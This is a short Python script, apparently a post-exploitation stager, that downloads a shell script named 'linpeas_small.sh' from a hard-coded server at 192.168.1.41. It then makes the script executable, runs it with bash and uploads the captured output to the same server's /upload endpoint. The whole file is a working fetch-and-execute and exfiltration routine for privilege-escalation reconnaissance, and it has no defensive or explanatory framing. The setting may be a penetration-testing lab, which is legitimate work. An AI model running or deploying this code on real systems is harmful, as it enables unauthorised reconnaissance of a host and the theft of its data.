import requests
import subprocess
import os

SERVER_URL = "http://192.168.1.41:5000"
UPLOAD_ENDPOINT = "/upload"
TOOLS_ENDPOINT = "/tools"
filename = "linpeas_small.sh"
output = "output.txt"

def run():
    try:
        response = requests.get(SERVER_URL +TOOLS_ENDPOINT +f"/{filename}")

        if response.status_code == 200:
            # 1. Save the initial file
            with open(filename, "wb") as f:
                f.write(response.content)
            print(f"{filename} downloaded successfully.")

            # 2. Clean the content (Fix Windows CRLF to Unix LF)
            with open(filename, "rb") as f:
                content = f.read()

            clean_content = content.replace(b"\r\n", b"\n")

            with open(filename, "wb") as f:
                f.write(clean_content)

            # 3. Ensure the file is executable (important for .sh files)
            os.chmod(filename, 0o755)

            # 4. Execute the file
            print(f"Executing {filename}...")

            with open(output, "w") as f:
                with subprocess.Popen(['/bin/bash', filename], stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                      text=True) as proc:
                    for line in proc.stdout:
                        f.write(line)
                    proc.wait()


            # Print the output from the executed tool


            if proc.stderr:
                print("--- Errors ---")
                print(proc.stderr)

            try:
                with open(f"{output}", "rb") as file:
                    files = {"file": file}
                    response = requests.post(SERVER_URL + UPLOAD_ENDPOINT, files=files)
                    print(response.status_code, response.text)

            except Exception as e:
                print(f"[!] Upload error: {e}")

        else:
            print(f"Failed to download. Status code: {response.status_code}")

    except Exception as e:
        print(f"An error occurred: {e}")